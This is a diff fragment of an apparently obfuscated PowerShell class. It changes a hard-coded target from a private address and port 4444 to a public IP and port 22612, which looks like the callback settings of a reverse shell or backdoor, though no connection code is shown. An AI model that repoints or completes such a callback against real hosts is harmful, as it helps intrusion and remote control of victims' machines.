@@ -1,7 +1,7 @@
 class FtStuRQQLFDleK {
     
-    [string]$eztbwRL = "192.168.0.107"
-    [int]$QYLgfZdkeCFJ = 4444
+    [string]$eztbwRL = "65.0.50.125"
+    [int]$QYLgfZdkeCFJ = 22612
 
     $yZzZbVrLUdaBgB
     $sQxDdRXiRshYposzSsEX
